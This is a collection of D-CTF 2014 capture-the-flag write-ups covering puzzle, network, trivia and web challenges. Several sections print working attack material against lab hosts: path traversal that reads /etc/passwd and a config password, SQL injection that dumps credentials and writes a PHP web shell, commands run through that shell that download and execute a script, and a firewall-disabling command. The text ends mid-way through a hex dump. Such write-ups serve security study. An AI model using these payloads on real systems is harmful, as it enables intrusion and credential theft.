<!--iVBORw0KGgoAAAANSUhEUgAAABwAAAAUCAIAAAARPMquAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAB3RJTUUH3goNFiAI385k0QAAAPVJREFUOMuNVEESxCAIC47/Nr6cPahbpUDtCRWTEDMVKNxPAQhEoQJRAE9h6tdSCzpdUPkXaguDOI5UnmUZTT7uEuju7zLNZomaIoh327uhRAKTCRK9Iah7LScwzdWcMbjcgyMSBBoP9JoAmcugQsVIbl52DqUtBm0cuV1yFocrqE4VMa3/9ETfODylnNmVdmVFPhmn0phz9un5zIuZgOaeZobKjikDd5jWo/GHEJ4qEKgYPoFH2nylC+qju104Oz010euxD921WxSUfayaMAu3q4vZxIPLjW7G7/H7Lmc/4mHmqB6/72y7iy23H7wSt7nPxxLVH88jbs4UmdXpAAABlmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4KPHg6eG1wbWV0YSB4bWxuczp4PSdhZG9iZTpuczptZXRhLycgeDp4bXB0az0nSW1hZ2U6OkV4aWZUb29sIDkuNDYnPgo8cmRmOlJERiB4bWxuczpyZGY9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMnPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6ZGM9J2h0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvJz4KICA8ZGM6ZGN0Zj42ZmI1MzI5NWI1MzVlYmRmZmExYWM4ODQzZmM2YWNkZDwvZGM6ZGN0Zj4KIDwvcmRmOkRlc2NyaXB0aW9uPgo8L3JkZjpSREY+CjwveDp4bXBtZXRhPgo8P3hwYWNrZXQgZW5kPSdyJz8+KPPlkwAAAABJRU5ErkJggg==-->
```

That looks like base64. Let’s see what it decodes to:

```bash
$ base64 --decode <<< 'iVBORw0KGgoAAAANSUhEUgAAABwAAAAUCAIAAAARPMquAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAB3RJTUUH3goNFiAI385k0QAAAPVJREFUOMuNVEESxCAIC47/Nr6cPahbpUDtCRWTEDMVKNxPAQhEoQJRAE9h6tdSCzpdUPkXaguDOI5UnmUZTT7uEuju7zLNZomaIoh327uhRAKTCRK9Iah7LScwzdWcMbjcgyMSBBoP9JoAmcugQsVIbl52DqUtBm0cuV1yFocrqE4VMa3/9ETfODylnNmVdmVFPhmn0phz9un5zIuZgOaeZobKjikDd5jWo/GHEJ4qEKgYPoFH2nylC+qju104Oz010euxD921WxSUfayaMAu3q4vZxIPLjW7G7/H7Lmc/4mHmqB6/72y7iy23H7wSt7nPxxLVH88jbs4UmdXpAAABlmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4KPHg6eG1wbWV0YSB4bWxuczp4PSdhZG9iZTpuczptZXRhLycgeDp4bXB0az0nSW1hZ2U6OkV4aWZUb29sIDkuNDYnPgo8cmRmOlJERiB4bWxuczpyZGY9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMnPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6ZGM9J2h0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvJz4KICA8ZGM6ZGN0Zj42ZmI1MzI5NWI1MzVlYmRmZmExYWM4ODQzZmM2YWNkZDwvZGM6ZGN0Zj4KIDwvcmRmOkRlc2NyaXB0aW9uPgo8L3JkZjpSREY+CjwveDp4bXBtZXRhPgo8P3hwYWNrZXQgZW5kPSdyJz8+KPPlkwAAAABJRU5ErkJggg==' > comment

$ file comment
comment: PNG image data, 28 x 20, 8-bit/color RGB, non-interlaced

$ mv comment comment.png
```

The resulting `comment.png` file looks like this:

![](comment.png)

Let’s check its EXIF data:

```bash
$ exiftool comment.png
ExifTool Version Number         : 9.72
File Name                       : comment.png
Directory                       : .
File Size                       : 760 bytes
File Modification Date/Time     : 2014:10:19 17:00:51+02:00
File Access Date/Time           : 2014:10:19 16:58:04+02:00
File Inode Change Date/Time     : 2014:10:19 17:00:51+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 28
Image Height                    : 20
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Modify Date                     : 2014:10:13 22:32:08
XMP Toolkit                     : Image::ExifTool 9.46
Dctf                            : 6fb53295b535ebdffa1ac8843fc6acdd
Image Size                      : 28x20
```

That `Dctf` entry with value `6fb53295b535ebdffa1ac8843fc6acdd` looks interesting, but it isn’t the flag. Googling it reveals that it is the MD5 hash of the string `brainloller`. [_Brainloller_](http://esolangs.org/wiki/Brainloller) is a visual dialect of [the _brainfuck_ programming language](https://en.wikipedia.org/wiki/Brainfuck).

What if [`comment.png`](comment.png) is a Brainloller program? Using [an open-source Brainloller implementation](https://github.com/Fedcomp/Brainloller-class) we find out the image translates to the following brainfuck program:

```brainfuck
++++++++[>+>++>+++>++++>+++++>++++++>+++++++>++++++++>+++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++++>++++++++++++++>+++++++++++++++>++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<.
```

This program prints the flag `youdidwell`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Misc 400 – Conquest of Gaul

**Category:** Misc
**Points:** 400
**Description:**

> Enter Caesar vault sit at his desk and look for the hidden cabinet box! 10.66.66.3. Don't forget to switch the VPN server.

## Write-up

This server kept going down (the exploit is a once-off), so we were eventually provided with a VirtualBox image. Since everyone had the image, there would be two ways of solving this.

### Intended solution: connect to the FTP server

It turns out you can log in with username `anonymous` and password `anonymous`, and also that the FTP server software is Cesar FTP server 0.99g. That version has [a buffer overflow vulnerability in the `MKD` command](http://secunia.com/advisories/20574/), and there is even [a Metasploit module](http://www.exploit-db.com/exploits/16713/) for it! Exploiting that vulnerability gets you access.

There is a hidden file on the desktop named `ThisIsit.txt`, and inside that the string `you deserve a very nice Caesar Salad!`.

We tried using the entire string as well as `Caesar Salad!` as a key, but eventually we used just `Caesar Salad` and that worked as a flag.

Fun challenge, too bad it was down.

### Alternate solution

We have the machine VM! Just boot it into single user mode, reset the password for the `FTP` Windows user account, and look on the machine. We found the file called `ThisIsIt.txt` and it was done. This was not the intended way to solve the challenge.

### Alternate alternate solution

Even easier, after they handed out the VM image: Simply mount the .vdi and have a look at the file directly.

## Other write-ups and resources

* none yet
# D-CTF 2014: Network 100 – PCT

**Category:** Network
**Points:** 100
**Description:**

> My manager lives at 10.13.37.21. Any guest is always welcome. But he has a secret. Can you find it out?

## Write-up

The following solution involves some random guessing, hunches, and curiosity.

The statement “Any guest is always welcome” is a hint about a guest or public account of perhaps a user account.

After testing some combinations of `username: guest` and `password: <blank>` or `welcome ` or `guest` to the login form that’s displayed when you open `http://10.13.37.21/` from a web browser, we switched to testing it for SSH login. We ran `ssh guest@10.13.37.21` and it seems that an SSH daemon is actually up. After a few connection attempts, we discovered that the password is also `guest`.

Navigating and listing the directory of `/var/www` revealed an `html` folder, and `ls /var/www/html` reveals some folders and an `index.php` file. Running `cat /var/www/html/index.php` reveals some interesting PHP code at the top of the file.

One line reads:

> The secret is behind 0f388689dc4728cfde0de9a1ee47c8d3 :)

Googling `0f388689dc4728cfde0de9a1ee47c8d3` reveals that it is the MD5 hash of the string `ididyourmom`, which is the flag.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/10/defcamp-ctf-quals-2014---network-100--pct-100pts-writeup/>
# D-CTF 2014: Network 200 – The Manager is back

**Category:** Network
**Points:** 200
**Description:**

> That fucking manager got smarter. He moved to house number 22, but we got this: [fuckmanagers.pcap](manager.pcap)

## Write-up

After looking at [the provided packet capture file](manager.pcap) in Wireshark for a while, we spot a single `POST` request (easily visible using the `http.request.method == "POST"` filter). Right-click on the packet and select _Copy_ → _Bytes_ → _Printable Text Only_ to get its details:

```
E8@@


%RP5gO*M
odLPOST / HTTP/1.1
Host: 10.13.37.22
Connection: keep-alive
Content-Length: 89
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://10.13.37.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://10.13.37.22/
Accept-Encoding: gzip,deflate
Accept-Language: en-US,en;q=0.8,ro;q=0.6,ru;q=0.4
Cookie: PHPSESSID=7hnoc09he3vtohslep97fdm8o0

user=manager&nonce=7413734ab666ce02cf27c9862c96a8e7&pass=3ecd6317a873b18e7dde351ac094ee3b
```

There is indeed a login form hosted at `http://10.13.37.22/` (“house number 22”). Let’s try submitting the same username, nonce, and password as found in the packet capture file:

```bash
$ curl --data 'user=manager&nonce=7413734ab666ce02cf27c9862c96a8e7&pass=3ecd6317a873b18e7dde351ac094ee3b' http://10.13.37.22/
Invalid nonce.
```

Ah, that would’ve been too easy.

Looking more closely at the login page, we find out the password is hashed and XORed with a nonce on the client-side before submitting it as `POST` data:

```js
$('.hook-submit').click(function(){
  var h1 = md5($('#pass').val());
  var h2 = $('#nonce').val();
  var xor = myxor(h1, h2);
  $('#hiddenpass').val(xor);
  setTimeout(function() { $('#form').submit(); }, 100);
});
```

This means that the `password` value that was recorded in the packet capture file (i.e. `3ecd6317a873b18e7dde351ac094ee3b`) is the result of `myxor(md5(password), '7413734ab666ce02cf27c9862c96a8e7')` for some value of `password`.

```
'3ecd6317a873b18e7dde351ac094ee3b' == myxor(md5(password), '7413734ab666ce02cf27c9862c96a8e7')
```

However, some quick testing reveals that the `myxor` function is not actually a XOR implementation:

```js
myxor('a', 'a');
// → '4'
myxor('b', 'b');
// → '6'
```

A true XOR function would return `0` in both cases (since `A ⊕ A = 0` for XOR ciphers).

All we need to do is find out what the original value of `password` was. Actually, it would be sufficient to find out what `md5(password)` was – then we could just `myxor()` it with the nonce the page presented, and submit that as `POST` data.

To do either of these things, we have to reverse the `myxor()` function as found in <http://10.13.37.22/js/scripts.js>. Here’s what the original code looks like:

```js
function is_numeric(mixed_var) {
  var whitespace =
    " \n\r\t\f\x0b\xa0\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u200b\u2028\u2029\u3000";
  return (typeof mixed_var === 'number' || (typeof mixed_var === 'string' && whitespace.indexOf(mixed_var.slice(-1)) === -
    1)) && mixed_var !== '' && !isNaN(mixed_var);
}

function ord(string) {
  var str = string + '',
    code = str.charCodeAt(0);
  if (0xD800 <= code && code <= 0xDBFF) {
    var hi = code;
    if (str.length === 1) {
      return code;
    }
    var low = str.charCodeAt(1);
    return ((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000;
  }
  if (0xDC00 <= code && code <= 0xDFFF) {
    return code;
  }
  return code;
}

function chr(codePt) {

  if (codePt > 0xFFFF) {
    codePt -= 0x10000;
    return String.fromCharCode(0xD800 + (codePt >> 10), 0xDC00 + (codePt & 0x3FF));
  }
  return String.fromCharCode(codePt);
}

function hex2n(c) {
  if(is_numeric(c)) return parseInt(c);
  return ord(c) - ord('a') + 10;
}

function n2hex(n) {
  if(n < 10) { return '' + n; }
  return chr(ord('a') + n - 10);
}

function myxor(h1, h2) {
  var xored = '';
  for(i = 0; i<h1.length; i++) {
    var c1 = h1.charAt(i);
    var c2 = h2.charAt(i);
    xored += n2hex((hex2n(c1) + hex2n(c2)) % 16);
  }
  return xored;
}
```

After reversing, that becomes:

```js
function reversemyxor(xored) {
  var h2 = '7413734ab666ce02cf27c9862c96a8e7'; // The nonce that was used by the manager.
  var h1 = '';
  for (var i = 0; i < xored.length; i++) {
    var x1 = xored.charAt(i); // == n2hex((hex2n(c1) + hex2n(c2)) % 16)
    var c2 = h2.charAt(i);
    // Find `c1`, knowing that:
    // x1 == n2hex((hex2n(c1) + hex2n(c2)) % 16)
    // hex2n(x1) == (hex2n(c1) + hex2n(c2)) % 16
    // hex2n(x1) == ((hex2n(c1) % 16) + (hex2n(c2) % 16)
    // hex2n(x1) - (hex2n(c2) % 16) == hex2n(c1) % 16
    // n2hex(hex2n(x1) - (hex2n(c2) % 16)) == c1
    var number = hex2n(x1) - (hex2n(c2) % 16);
    if (number < 0) {
      number += 16;
    }
    var c1 = n2hex(number);
    h1 += c1;
  }
  return h1;
}
```

With this, we can find out what `md5(password)` was for the manager, before it got XORed with the nonce `7413734ab666ce02cf27c9862c96a8e7`:

```js
reversemyxor('3ecd6317a873b18e7dde351ac094ee3b');
// → 'cabaf0ddf21df38cbeb77c94a40e4654'
```

Since `cabaf0ddf21df38cbeb77c94a40e4654` is not a known MD5 hash, we cannot easily find out what the actual password is. But we can use this MD5 hash and XOR it with the nonce we get when we open the login page, and then submit the resulting values as `POST` data. Here’s a JavaScript snippet that does just that — run it in your favorite browser’s DevTools console on the login page:

```js
// XOR the hash we found with the given nonce.
var nonce = $('#nonce').val();
var hash = 'cabaf0ddf21df38cbeb77c94a40e4654';
var xored = myxor(hash, nonce);

// Fill out the form.
$('#user').val('manager');
$('#pass').val(xored);
$('#hiddenpass').val(xored);

// Remove the existing hooks.
$('.hook-submit').unbind();

// Submit the form.
$('#form').submit();
```

After this, we are successfully logged in, and the website displays this message:

> The secret is behind bb00403ebcbfa0748bcbee426acfdb5b :)

A quick Google search reveals that `bb00403ebcbfa0748bcbee426acfdb5b` is the MD5 hash for the string `youtoo`.

The flag is `youtoo`.

### Alternate solution

Similar to how the Network 100 challenge was solved by SSHing into the box, we successfully SSHed into Network 200’s box using `ssh guest@10.13.37.22` and `guest` as the password.

Navigating and listing the directory of `/var/www` gave up a `html` folder, and `ls /var/www/html` reveals some folders and an `index.php` file. Running `cat /var/www/html/index.php` reveals some interesting PHP code at the top of the file. One line reads:

> The secret is behind bb00403ebcbfa0748bcbee426acfdb5b :)

Googling `bb00403ebcbfa0748bcbee426acfdb5b` reveals that it is the MD5 hash of the string `youtoo`, which is the flag.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/10/defcamp-ctf-quals-2014---network-200--the-manager-is-back-200pts-writeup/>
# D-CTF 2014: Network 300 – Knock me

**Category:** Network
**Points:** 300
**Description:**

> ```
> - Knock, knock!- Who's there?
> - Leet
> - Leet who?
> - Elite
> 10.13.37.23
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# D-CTF 2014: Network 400 – Telepathy

**Category:** Network
**Points:** 400
**Description:**

> You dont have to be telepathic to read 10.13.37.24 mind!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# D-CTF 2014: Quest 100 – Warm Up

**Category:** Quest
**Points:** 100
**Description:**

> My password is password but it is `2_*_10_*_16_*_8_*_4` characters long. Whats my password ? Ha ha ha!

## Write-up

The answer was the MD5 hash of the string `password`, i.e.:

```bash
$ md5 -s password
MD5 ("password") = 5f4dcc3b5aa765d61d8327deb882cf99
```

Explanation:

* `2*4 = 8` = number of bytes in the string `password`
* `10*16-8*2 = 128` = number of bits in an MD5 hash
* `4*8 = 32 = 16*2` = number of bytes in the hexadecimal representation of an MD5 hash

## Other write-ups and resources

* none yet
# D-CTF 2014: Quest 200 – Joint

**Category:** Quest
**Points:** 200
**Description:**

> TCP/IP swiss army?

## Write-up

The flag is `netcat`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Quest 300 – CLI Ambassador

**Category:** Quest
**Points:** 300
**Description:**

> From the CLI disable the windows XP firewall?

## Write-up

The flag is `netsh firewall set opmode mode=DISABLE`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Quest 400 – Shake it Baby

**Category:** Quest
**Points:** 400
**Description:**

> I know you know the winning move but do you know the code?

## Write-up

“The only winning move is not to play” is a quote from [the 1983 movie WarGames](https://en.wikipedia.org/wiki/WarGames)

Throughout the movie, [several launch codes are used](http://mike.passwall.com/uselesstrivia/wargames.html). One of them is `cpe1704tks`, which turned out to be the flag.

## Other write-ups and resources

* none yet
# D-CTF 2014 write-ups

* <http://dctf.defcamp.ro/>
* [Scoreboard](http://dctf.defcamp.ro/ranks) or local alternatives: [Quals](./scoreboard_quals.txt) or [Finals](./scoreboard_finals.txt)

## Completed write-ups

* [Exploit 100](exploit-100)
* [Exploit 300](exploit-300)
* [Misc 100](misc-100)
* [Misc 200](misc-200)
* [Misc 300](misc-300)
* [Misc 400](misc-400)
* [Network 100](network-100)
* [Network 200](network-200)
* [Quest 100](quest-100)
* [Quest 300](quest-300)
* [Quest 400](quest-400)
* [Web 100](web-100)
* [Web 200](web-200)
* [Web 400](web-400)

## External write-ups only

* [Bonus 200](bonus-200)
* [Exploit 400](exploit-400)
* [Web 300](web-300)

## Incomplete write-ups

* [Bonus 100](bonus-100)
* [Exploit 200](exploit-200)
* [Network 300](network-300)
* [Network 400](network-400)
* [Quest 200](quest-200)
# D-CTF 2014: Web 100 – Find me

**Category:** Web
**Points:** 100
**Description:**

> Find the bug.
>
> ![](findthebug.png)
>
> **Hint:** it's a "word".

## Write-up

The answer was `ENT_QUOTES`. If `htmlspecialchars` is used with its default settings (as in the provided code example), single quotes (`'`) aren’t HTML-encoded, leading to potential XSS vulnerabilities in HTML attributes. Setting the `ENT_QUOTES` flag would have prevented that.

## Other write-ups and resources

* none yet
# D-CTF 2014: Web 200 – Warming

**Category:** Web
**Points:** 200
**Description:**

> A rose like any other name has spikes 10.13.37.12.

## Write-up

`http://10.13.37.12/` displays an image, located at `/cms/roses.jpg`, that says:

> “Roses may say “I love you,”

Note the missing `”` at the end – it seems this quotation is incomplete.

Based on the image URL, let’s check out the `/cms/` path. It redirects to `/cms/admin/login.php` which displays a login form. In the HTML source we find:

```html
<title>CMSmini - administration page</title>
```

A Google search for known [CMS Mini](http://sourceforge.net/projects/cmsmini/) vulnerabilities reveals [multiple vulnerabilities in v0.2.2](http://www.exploit-db.com/exploits/28128/), among which file inclusion:

```
http://
[target/IP]/cmsmini/admin/edit.php?path=&name=../../../../../etc/passwd
```

Let’s see if the given site is vulnerable (i.e. if it’s running v0.2.2 or older):

```bash
$ curl 'http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../etc/passwd'
```

And indeed, this returns the contents of `/etc/passwd` as part of the response.

After studying the CMS Mini source code, we learn that its configuration file is stored in `cms/admin/config.php`. Let’s find out what its contents are for this server:

```bash
$ curl -s 'http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../var/www/cms/admin/config.php'
…
$admin_login = 'admin';
$admin_pass = 'RosesmaysayIloveyoubutthecactussaysFuckoff';
…
```

The flag is `RosesmaysayIloveyoubutthecactussaysFuckoff`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Web 300 – Pigeon

**Category:** Web
**Points:** 300
**Description:**

> (y) 10.13.37.13

## Write-up

(TODO)

## Other write-ups and resources

* <http://dragosgaftoneanu.com/d-ctf-2014-prequals-writeups/>
* <http://www.mrt-prodz.com/blog/view/2014/10/defcamp-ctf-quals-2014---web-300--pigeon-300pts-writeup/>
# D-CTF 2014: Web 400 – Pigeon

**Category:** Web
**Points:** 400
**Description:**

> You just have to accept that some days you are the pigeon, and some days you are the statue. 10.13.37.14

## Write-up

Visiting `http://10.13.37.14/` (when connected to the CTF VPN) redirects to `http://10.13.37.14/index.php/auth/login` which presents a login screen. Since the form didn’t seem to be vulnerable to SQL injection, we clicked the ‘Register’ link and signed up for an account. The registration form contains a captcha image located at `http://10.13.37.14/captcha/1413716754.1985.jpg`. Removing the filename from that URL results into `http://10.13.37.14/captcha/` which is an open directory listing that contains some previously generated captchas.

Anway, after logging in, we’re presented with a list of files and their cost:

> Welcome to our file conversion service, **yourusername**! You are logged in now. [Logout](http://10.13.37.14/index.php/auth/logout)
>
> Warning! Beta!
>
> Filelist:
>
> * [English.doc - $10.00](http://10.13.37.14/index.php?id=1)
> * [English.docx - $20.00](http://10.13.37.14/index.php?id=2)
> * [Presentation.ppt - $15.00](http://10.13.37.14/index.php?id=3)

The link for each file is of the format `http://10.13.37.14/index.php?id=1`. The `id` URL parameter seems vulnerable to SQL injection. For example, to list all usernames, passwords, and emails in the `users` database:

```
http://10.13.37.14/index.php?id=3%20UNION%20ALL%20SELECT%201,concat(username,0x3a,password,0x3a,email),3%20FROM%20cms.users--
```

Similarly, the contents of some files of the server can be viewed as follows:

```
http://10.13.37.14/index.php?id=3%20UNION%20ALL%20SELECT%201,LOAD_FILE(%27/etc/passwd%27),3--
```

We can also write files of our own:

```
http://10.13.37.14/index.php?id=3%20UNION%20ALL%20SELECT%201%2C%27%3C%3Fphp%20header%28%22Content-Type%3A%20text%2Fplain%3Bcharset%3Dutf-8%22%29%3B%20echo%20system%28%24%5fGET%5B%22x%22%5D%29%3B%20%3F%3E%27%2C3%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fcaptcha%2Fshell.php%27--
```

This creates a simple PHP shell, accessible through `http://10.13.37.14/captcha/shell.php`. The `x` URL parameter takes a command to be executed. For example, `http://10.13.37.14/captcha/shell.php?x=id` reveals the current user:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`http://10.13.37.14/captcha/shell.php?x=ls%20-lsa%20%20/` reveals that there is a file at `/flag.txt`:

```
4 -rw-r-----   1 root ubuntu   21 Oct 17 01:27 flag.txt
```

Sadly, this file is not readable by the `www-data` user.

Let’s take a look at the active processes on the server. `http://10.13.37.14/captcha/shell.php?x=ps%20fuwax` reveals some interesting ones:

```
ubuntu    9170  0.0  0.0  27220   604 ?        Ss   Oct18   0:00 SCREEN -S o
ubuntu    9171  0.0  0.0  21096   764 pts/2    Ss   Oct18   0:00  \_ /bin/bash
ubuntu    9222  0.0  0.0 141188   808 pts/2    Sl+  Oct18   0:00      \_ /usr/lib/libreoffice/program/oosplash --accept=socket,host=localhost,port=2002;urp; --headless
ubuntu    9260  0.0 15.6 1400344 321088 pts/2  Sl+  Oct18   0:10          \_ /usr/lib/libreoffice/program/soffice.bin --accept=socket,host=localhost,port=2002;urp; --headless
```

LibreOffice’s `soffice.bin` accepts socket connections on `localhost:2002`. Using [`unoconv`](http://dag.wiee.rs/home-made/unoconv/) we can connect to it, and tell it to convert `/flag.txt` to a PDF. After reading the documentation we come up with the following command to do this:

```bash
unoconv --connection 'socket,host=127.0.0.1,port=2002,tcpNoDelay=1;urp;StarOffice.ComponentContext' -f pdf /flag.txt
```

Let’s install `unoconv` on the server (it’s just a matter of downloading a single file) and run the following command:

```
mkdir -p /tmp/flag; cd /tmp/flag; wget https://raw.githubusercontent.com/dagwieers/unoconv/master/unoconv; UNO_PATH=/usr/lib/libreoffice/program/ /usr/bin/python3.4 /tmp/flag/unoconv -v -f pdf --connection 'socket,host=127.0.0.1,port=2002,tcpNoDelay=1;urp;StarOffice.ComponentContext' --stdout /flag.txt | xxd -p | tr -d '\n'
```

So our payload becomes:

```
http://10.13.37.14/captcha/shell.php?x=mkdir%20-p%20%2Ftmp%2Fflag%3B%20cd%20%2Ftmp%2Fflag%3B%20wget%20https%3A%2F%2Fraw.githubusercontent.com%2Fdagwieers%2Funoconv%2Fmaster%2Funoconv%3B%20UNO_PATH%3D%2Fusr%2Flib%2Flibreoffice%2Fprogram%2F%20%2Fusr%2Fbin%2Fpython3.4%20%2Ftmp%2Fflag%2Funoconv%20-v%20-f%20pdf%20--connection%20%27socket%2Chost%3D127.0.0.1%2Cport%3D2002%2CtcpNoDelay%3D1%3Burp%3BStarOffice.ComponentContext%27%20--stdout%20%2Fflag.txt%20%7C%20xxd%20-p%20%7C%20tr%20-d%20%27%5Cn%27
```

This gives us the hex-encoding of the generated PDF file:

```
255044462d312e340a25c3a4c3bcc3b6c39f0a322030206f626a0a3c3c2f4c656e6774682033203020522f46696c7465722f466c6174654465636f64653e3e0a73747265616d0a789c2d88b10a83401044fbfd8aa92d2eb39b78e781042224bdb0901f88095808daf8fbd9e21898796f9814a7ec6024aba154c3b1c8bbc3d65ee2f8c9e4d2e734a0584e15fec1e5a550c2bf2395c62b6fd1c63e28372bb1036bf88313edeeab3c5d6699f107a0cc18670a656e6473747265616d0a656e646f626a0a0a332030206f626a0a3130350a656e646f626a0a0a352030206f626a0a3c3c2f4c656e6774682036203020522f46696c7465722f466c6174654465636f64652f4c656e6774683120393332303e3e0a73747265616d0a789ce5396b541be795f79b194948023d78088c008d18100f0102090ce62519d0180cc4e2e5805f4846e2616cc048766227ad6962c7b6fca249d649376ee336ed6e9a473dd8c91a278ee3363d7bd2366dbdbbedd93dad5dbb69daedd9c671b7a7e9eed98d61ef37120e769bec39db3d677fac9899efdefbddd777bffbddef9b2132bd2b048930032c78867604a672934cc900f00e00491eda1de15fdf9a9687f00d00a67e786a6447a1eba71f007059002ac5c8f63dc3cd3fad2b01d0228ff6dba3a1403069e5e10a00d3af51c7ca51243c73fb0525403a8f78dee88ec8838dcc8b1ce22d88676e9f1c0a3426971b11f7537c47e0c1a959f6eb2ce20f23ce4f047684ea4ddc3f217e0a20c13335198ef4826d01c07295f64f4d87a66efdcb5f3e86f847e8d336a411fca3bf4404951467584ea15425a8355af87ff953bca378073ea3f0421af8e5e75d3fae1652e10180c5f729f6f173e1feff5d2f1262cd2bf006bc00a7e16d840ec4bb0ec167e16b70f92ef637e13bf0221c858bf00c1cfb14b51750cfc332f4240c7e321b791e26e141f82ada7d14f5bd0e5b4894b0e087087c0ee6d1b68f9be3de5ae880df90b3f01651c343c4ce9c441f4e7e82c2c7e17918c7e7797c3e4309ccefe071a6112698afb15e388c23f4331d487e0b6ddf075f251b610baeb031f402101abd4b978d5d0b07e12184762def513cc2b840bbf87bf4f8309c404fc660276c84ee78f7590657091c632d389a6fc0ab32edc892acf2ebec14739149b8fd05f83cfe75e25f1082e473f02c3cbf30ba700a9e215ee285d9853f403aec5578994e485cfc40f134730426a003b68208bf861685d1e31de8efebede9eef2adbbafb3a37d6d5beb1ad1dbd2dcb4dae36e6ca8afab5d5553bdb2aaa2dc51565a525860cbcf1372ad968c54a341af4bd26ad4092aa582631902255e41f4f392cd2f7136a1b5b594e2420009816504bfc42349bc9b47e2fd321b7f37a7073987efe1f4c4383d77388981af87fad212de2bf0d2f75b047e9e6ce8ea47f8588b30c04b3765b85386399b8c242162b5a204efcd186de125e2e7bd92b87b34eaf5b7a0be39ada659680e694a4b604ea345508b9054284ccd91c24622034ca1b7768e8184246a5662f3bd81a0e4ebeaf7b698add681d292364927b4c85dd02cab9494cd924a56c98f51d7e1083f5772397a74de005bfdf6c4a0100c6cea97d800ca46596f347a5032daa522a1452adafb5e068e3c2495082d5ec94eb5b677dfb1d3feb1492229f20d021ffd107038c2cdf7efa604e21465bee143a0a088e18d46458117a3fe68607e7166abc01b84e85c626274ca8b11065f3f4acd2fbe76c42c89470724837f94d4c6072b76b74b295d1bfb25265fe4470348c1cb2d586bcc56e3c0128fef93ba010381e1c0985aad74e047e63db0151169a6ab3f86f3b0d57c163c0efb80c4f869cfe5a59eb43eda33b3d47347dc2fe06cb6f7f447252ebf2d287831c64702d2cc56cca76d742a0483a4fb83d92a44938dfc2ac780cccba3576dc1315e52d8302c28b55c0033858a440d32a2fb43acb9694603366332bf4a4035548f57f0fae3d7eed10c54c0979648adf6d8d4f7f64b9e16043c81f81c79e7ca1d2811f0e3148db5c8d327398429295568ba339fd42def584fbf2c121793529b25f00fc5a52487b7855ae6bd517f4bcc05aa4be8eabf00aec51b7395bcf99c0b2a61a085329b9a31af6cde687f7058b2f8cd415c69c37cbfd92a790670820784fed0004d348c50d10d3467952d4a4c736f7f7b8fd0deb5a1bf26ee48ac83aae3f2bdf7a811facd3135987252427e02dfcf98d901643420811711109aeaf129a9f213f03660c0652a4dd5a67abe9f9861891bdd908a786fa825ce47f1bb942a683a35b72e69535214f534b79aad03d6d8afb484c16e3e6e18251268505b97bad87cac044863508d4ca2b1cca039cff70b21614018e5258faf9f8e8d86478e723c1872cce373d57b17b62c581826b062f7124283298976f3f2e04a6b64fc0eda7a4f77db52371f4d10da7ba254b9105708e8799b0434853d3546b3bcfae97a16c4002e625cd1f27a8ece793c742d8fd2651b15da8251a1a7bf5ee6c60af219f35e6a2b19da497b6f53690916b3a639811cea9af390433d1bfa2f18f0d875a8b7ff2c4398667fd3c05c1ef6f55fe0013c3295a1544aa4084f11aaa91b910499df7cc1033023f7723241c687e609c8b484251a81a1792646332cd118a471319a47a6d11fce52c628c618ebb7970fd2f979786034ea1fa0390e268c085e442242234647689c238c3251d208a126492b3451ba9bd2dd31ba92d2559819c4444a4bf6460d5ee1c38c52797b073caf3241451f9e9255503647c0517f56c565dd74ce291557ebcfb20c8230c752b28292cfaa94d91fd59f2594ee325a8df956a3b585e117f2c8d30ba38abeff78b185fb3e3d9850e5dc3b782e73920e8fd19a90089d4c86813eb489d061985ff